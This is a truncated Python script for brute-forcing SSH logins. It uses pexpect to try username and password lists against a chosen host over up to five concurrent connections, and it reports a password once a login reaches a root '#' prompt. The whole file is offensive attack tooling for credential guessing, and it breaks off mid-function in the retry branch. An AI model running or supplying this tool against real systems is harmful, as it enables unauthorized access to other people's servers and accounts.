import pexpect
import optparse
import time
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)

Found = False
Fails = 0

# function to parse commandline arguments
def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-H", "--host", dest="host", help="Host to attempt SSH Bruteforce")
    parser.add_option("-u", "--username", dest="username", help="Username list to attempt SSH Bruteforce")
    parser.add_option("-p", "--password", dest="password", help="Password list to attempt SSH Bruteforce")
    (options, arguments) = parser.parse_args()
    if not options.host:
        parser.error("[-] Please specify the host, use --help for more info")
    elif not options.username:
        parser.error("[-] Please specify the username list, use --help for more info")
    elif not options.password:
        parser.error("[-] Please specify the password list, use --help for more info")
    return options

# function to connect to the server
def connect(host, user, password, release):
    global Found
    global Fails
    try:
        s = pexpect.spawn('ssh -l ' + user + ' ' + host)
        s.expect('Password:')
        s.sendline(password)
        s.expect('#')
        print('[+] Password Found : ' + password)
        Found = True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect